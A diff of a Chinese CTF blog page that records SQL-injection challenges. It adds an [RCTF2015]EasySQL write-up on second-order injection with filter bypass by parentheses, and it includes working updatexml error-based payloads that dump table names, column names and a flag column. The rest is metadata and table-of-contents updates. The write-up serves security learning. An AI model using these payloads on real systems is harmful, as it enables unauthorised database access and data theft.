@@ -82,13 +82,13 @@
 
 
 
-<meta name="description" content="实验课遇见的题目 语句 1select count(*) from t_info where username = &amp;apos;$name&amp;apos; or nickname = &amp;apos;$name&amp;apos; 双参数注入, 要求返回结果不为空 1name=or(1)#\ 极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读">
+<meta name="description" content="[RCTF2015]EasySQL 考察二次注入 开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的mid, substr, and,空格, /**/等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入. 11&amp;quot;&amp;amp;&amp;amp;updatexml(1,concat(0x7e,(select(group_concat(table_name">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/SQL题型记录/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="实验课遇见的题目 语句 1select count(*) from t_info where username = &amp;apos;$name&amp;apos; or nickname = &amp;apos;$name&amp;apos; 双参数注入, 要求返回结果不为空 1name=or(1)#\ 极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读">
+<meta property="og:description" content="[RCTF2015]EasySQL 考察二次注入 开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的mid, substr, and,空格, /**/等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入. 11&amp;quot;&amp;amp;&amp;amp;updatexml(1,concat(0x7e,(select(group_concat(table_name">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png">
@@ -105,10 +105,10 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58558693-12748280-8254-11e9-8acb-ba824cb791cd.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png">
-<meta property="og:updated_time" content="2019-12-28T18:10:57.551Z">
+<meta property="og:updated_time" content="2020-01-05T07:51:53.440Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL 题型记录[working forever]">
-<meta name="twitter:description" content="实验课遇见的题目 语句 1select count(*) from t_info where username = &amp;apos;$name&amp;apos; or nickname = &amp;apos;$name&amp;apos; 双参数注入, 要求返回结果不为空 1name=or(1)#\ 极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读">
+<meta name="twitter:description" content="[RCTF2015]EasySQL 考察二次注入 开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的mid, substr, and,空格, /**/等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入. 11&amp;quot;&amp;amp;&amp;amp;updatexml(1,concat(0x7e,(select(group_concat(table_name">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png">
 
 
@@ -349,8 +349,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:10:57+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2020-01-05T15:51:53+08:00">
+                2020-01-05
               </time>
             
           </span>
@@ -399,7 +399,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  5.5k
+                  5.8k
                 </span>
               
 
@@ -415,7 +415,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  29
+                  30
                 </span>
               
             </div>
@@ -436,7 +436,16 @@
       
 
       
-        <h2 id="实验课遇见的题目">实验课遇见的题目</h2>
+        <h2 id="RCTF2015-EasySQL">[RCTF2015]EasySQL</h2>
+<p>考察二次注入</p>
+<p>开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的<code>mid, substr, and,空格, /**/</code>等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1);#</span><br></pre></td></tr></table></figure>
+<p>查users这个表, 但是默认会查到系统自带的, 再增加一个条件就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)&amp;&amp;(table_schema=database()),0x7e),1);#</span><br></pre></td></tr></table></figure>
+<p>就可以知道列名.</p>
+<p>尝试查询, 发现很多项的内容都是xxx, 但是substr又不能用, 就用条件判断好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br><span class="line"></span><br><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br></pre></td></tr></table></figure>
+<h2 id="实验课遇见的题目">实验课遇见的题目</h2>
 <p>语句</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;</span><br></pre></td></tr></table></figure>
 <p>双参数注入, 要求返回结果不为空</p>
@@ -696,7 +705,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -784,7 +793,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验课遇见的题目"><span class="nav-number">1.</span> <span class="nav-text">实验课遇见的题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-Final-SQL"><span class="nav-number">2.</span> <span class="nav-text">极客大挑战 Final SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XDCTF-2015-filemanager"><span class="nav-number">3.</span> <span class="nav-text">XDCTF  2015 filemanager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#facebook-ctf-2019-product-manager"><span class="nav-number">4.</span> <span class="nav-text">facebook ctf 2019 product manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web1"><span class="nav-number">5.</span> <span class="nav-text">swpuctf 2019 web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web4"><span class="nav-number">6.</span> <span class="nav-text">swpuctf 2019 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Comment"><span class="nav-number">7.</span> <span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1ta-ctf-2019-giftbox"><span class="nav-number">8.</span> <span class="nav-text">De1ta ctf 2019 giftbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CyBRICS-CTF-2019-NopeSQL"><span class="nav-number">9.</span> <span class="nav-text">CyBRICS CTF 2019 NopeSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#websec-level-4"><span class="nav-number">10.</span> <span class="nav-text">websec level 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-百度杯Vld"><span class="nav-number">11.</span> <span class="nav-text">ichunqiu 百度杯Vld</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">12.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-SQL"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyan-club-login-background"><span class="nav-number">14.</span> <span class="nav-text">shiyan-club login background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyanbar-登陆一下好吗？"><span class="nav-number">15.</span> <span class="nav-text">shiyanbar 登陆一下好吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cbc-字节翻转攻击注入"><span class="nav-number">16.</span> <span class="nav-text">cbc 字节翻转攻击注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验课遇见的题目"><span class="nav-number">2.</span> <span class="nav-text">实验课遇见的题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-Final-SQL"><span class="nav-number">3.</span> <span class="nav-text">极客大挑战 Final SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XDCTF-2015-filemanager"><span class="nav-number">4.</span> <span class="nav-text">XDCTF  2015 filemanager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#facebook-ctf-2019-product-manager"><span class="nav-number">5.</span> <span class="nav-text">facebook ctf 2019 product manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web1"><span class="nav-number">6.</span> <span class="nav-text">swpuctf 2019 web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web4"><span class="nav-number">7.</span> <span class="nav-text">swpuctf 2019 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Comment"><span class="nav-number">8.</span> <span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1ta-ctf-2019-giftbox"><span class="nav-number">9.</span> <span class="nav-text">De1ta ctf 2019 giftbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CyBRICS-CTF-2019-NopeSQL"><span class="nav-number">10.</span> <span class="nav-text">CyBRICS CTF 2019 NopeSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#websec-level-4"><span class="nav-number">11.</span> <span class="nav-text">websec level 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-百度杯Vld"><span class="nav-number">12.</span> <span class="nav-text">ichunqiu 百度杯Vld</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">13.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-SQL"><span class="nav-number">14.</span> <span class="nav-text">ichunqiu SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyan-club-login-background"><span class="nav-number">15.</span> <span class="nav-text">shiyan-club login background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyanbar-登陆一下好吗？"><span class="nav-number">16.</span> <span class="nav-text">shiyanbar 登陆一下好吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cbc-字节翻转攻击注入"><span class="nav-number">17.</span> <span class="nav-text">cbc 字节翻转攻击注入</span></a></li></ol></div>
             
 
           </div>
@@ -804,7 +813,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -818,7 +827,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">63.1k</span>
+    <span title="Site words total count">65k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
